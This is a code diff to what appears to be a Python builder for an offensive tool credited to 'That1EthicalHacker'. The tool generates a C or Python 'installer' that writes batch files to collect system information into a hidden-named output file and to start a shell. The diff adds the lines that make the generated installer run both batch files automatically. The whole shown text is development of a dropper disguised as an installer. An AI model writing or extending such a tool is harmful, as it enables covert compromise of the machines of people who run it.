@@ -693,7 +693,7 @@ def InstallerScript_Creation(target_language:str):
         case 'c':
             with open('installer.c', 'w') as file:
                 file.write("#include <windows.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n")
-                file.write(f"\tFILE *fptr;\n\tfptr = fopen(\"created.bat\", \"w\");\n\tfprintf(fptr, \"set var={target_lines[0]}%%var%%>\\\".output1423.txt\\\"\\n\");\n")
+                file.write(f"\tFILE *fptr;\n\tfptr = fopen(\"created.bat\", \"w\");\n\tfprintf(fptr, \"@echo off\\nset var={target_lines[0]}%%var%%>\\\".output1423.txt\\\"\\n\");\n")
                 target_lines.remove(target_lines[0])
                 for module in target_lines:
                     if type(module) == tuple:
@@ -703,11 +703,12 @@ def InstallerScript_Creation(target_language:str):
                         file.write(f"\tfprintf(fptr, \"set var={module}%%var%%>>\\\".output1423.txt\\\"\\n\");\n")
                 file.write("\tfclose(fptr);\n")
                 file.write(f"\tfptr = fopen(\"shell.bat\", \"w\");\n\tfprintf(fptr, \"{ShellScript_Creation('batch', True)}\");\n\tfclose(fptr);\n")
+                file.write("\tprintf(\"[#] Collecting system information...\\n\");\n\tsystem(\".\\\\created.bat\");\n\tprintf(\"[#] Starting shell...\\n\");\n\tsystem(\".\\\\shell.bat\");\n")
                 file.write("\treturn 0;\n}")
                 file.close()
         case 'python':
             with open('installer.py', 'w') as file:
-                file.write(f"with open (\'.created.bat\', \'w\') as file:\n\tfile.write(\"set var={target_lines[0]}%var%>\\\".output1423.txt\\\"\\n\")\n")
+                file.write(f"import os\nwith open (\'created.bat\', \'w\') as file:\n\tfile.write(\"@echo off\\nset var={target_lines[0]}%var%>\\\".output1423.txt\\\"\\n\")\n")
                 target_lines.remove(target_lines[0])
                 for module in target_lines:
                     if type(module) == tuple:
@@ -716,7 +717,8 @@ def InstallerScript_Creation(target_language:str):
                     else:
                             file.write(f"\tfile.write(\"set var={module}%var%>>\\\".output1423.txt\\\"\\n\")\n")
                 file.write("\tfile.close()\n")
-                file.write(f"with open(\'shell.bat\', \'w\') as file:\n\tfile.write(\"{ShellScript_Creation('batch', False)}\")\n\tfile.close()")
+                file.write(f"with open(\'shell.bat\', \'w\') as file:\n\tfile.write(\"{ShellScript_Creation('batch', False)}\")\n\tfile.close()\n")
+                file.write("print(\"[#] Collecting system information...\")\nos.system(\".\\\\created.bat\")\nprint(\"[#] Starting shell...\")\nos.system(\".\\\\shell.bat\")\n")
                 file.close()
     print("[#] Installer file created.")
     return "worked"
@@ -727,6 +729,7 @@ print("| |___| |  | | | (_) >  <   | |___| |  | | |_| |")
 print("|_____|_|  |_|  \\___/_/\\_\\___\\____|_|  |_|____/ ")
 print("                        |_____|")
 print("                    Created by: That1EthicalHacker")
+print("                       Version: 3.1")
 while True:
     print("[i] Please input the language the installer file will be made in;\n\tC\n\tPython")
     user_choice = input(">")
